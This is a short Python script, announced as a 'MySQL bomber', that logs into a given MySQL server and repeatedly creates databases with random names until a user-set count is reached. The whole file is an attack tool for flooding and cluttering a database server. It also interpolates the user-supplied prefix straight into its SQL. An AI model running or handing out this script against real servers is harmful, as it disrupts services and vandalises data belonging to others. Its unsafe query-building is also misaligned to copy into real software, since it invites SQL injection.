import mysql.connector, os, sys, colorama, random, string
from mysql.connector import errorcode
from colorama import Fore

HOST = sys.argv[1]
USER = sys.argv[2]
PASS = sys.argv[3]
AMMOUNT = int(sys.argv[4])
PREFIX = sys.argv[5]


def Log(txt:str):
    '''
    sexy logs
    '''
    print(f"[{Fore.BLUE}+{Fore.RESET}] {txt}.")

def add_data(ip:str,mysqluser:str,mysqlpass:str,dbname:str):
    try:

        conn = mysql.connector.connect(user=mysqluser, password=mysqlpass, host=ip)
        cursor = conn.cursor()

        query = f"CREATE DATABASE {dbname}"

        cursor.execute(query)

        conn.commit()

        return True


    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR: # if error code is catched (failed password)
            return False

def gen_rand_str(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def main():
    Log("Starting MySQL bomber")

    for _ in range(AMMOUNT):

        DBNAME = PREFIX+gen_rand_str(15)

        if add_data(HOST,USER,PASS,DBNAME):
            Log(f"Added database {DBNAME}")
        else:
            Log(f"Error adding database {DBNAME}")




if __name__ == "__main__":
    main()
